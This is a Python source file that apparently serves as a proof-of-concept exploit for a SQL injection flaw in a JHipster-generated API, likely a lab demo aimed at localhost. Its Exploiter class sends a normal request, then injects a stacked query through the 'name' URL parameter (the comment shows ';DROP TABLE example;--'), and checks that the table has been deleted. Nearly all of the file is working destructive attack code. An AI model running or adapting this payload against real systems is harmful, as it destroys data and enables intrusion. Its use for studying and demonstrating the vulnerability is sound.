import json
import requests
from Sample.Logger import Logger

class Exploiter:
    '''
    Exploiter. This class contains the methods used to exploit the vulnerability
    in JHipster.
    '''
    
    def __init__(self, HOST: str, PORT: int):
        '''
        Loading information and initializing targets.
        '''
        self.logger = Logger()
        self.logger.print_banner()    
        self.target = f'http://{HOST}:{PORT}/api'
        
        # Loading json
        with open('./Results/expected-result.json') as file:
            self.expected_json = json.load(file)
            
            
    def set_query(self, query: str) -> None:
        '''
        Set the query to be run as exploit.
        '''
        self.query = query
        return
        
        
    def run(self) -> None:
        '''
        Running the exploit. This method will use the requests library to create GET requests
        and inject SQL malicious query.
        '''
        
        # Making legit request: GET http://localhost:8080/api/all-examples
        self.logger.log('Making legit GET request.')
        self.logger.request("GET", f'{self.target}/all-examples')
        response = requests.get(f'{self.target}/all-examples')
        assert response.json() == self.expected_json
        self.logger.success('Data is retrieved correctly!\n')
        
        # Making malicious request: GET http://localhost:8080/api/examples?name=foobar';DROP TABLE example;--
        self.logger.log('Making malicious GET request.')
        self.logger.warning('Table example is about to be removed !')
        self.logger.request("GET", f"{self.target}/examples?name=foobar';{self.query};--")
        response = requests.get(f"{self.target}/examples?name=foobar';{self.query};--")
        assert response.json() == []
        self.logger.warning('Malicious query injected!\n')
        
        # Checking result of the attack
        self.logger.log('Attempt to retrieve examples.')
        self.logger.request("GET", f'{self.target}/all-examples')
        response = requests.get(f'{self.target}/all-examples')
        assert response.status_code == 500
        self.logger.log(f'Returned status code: {response.status_code}.')
        self.logger.log('Returned content body is: ')
        self.logger.warning(response.json()['detail'])
        self.logger.warning('Table example removed from the Database <.< !\n')
        
        
        
    
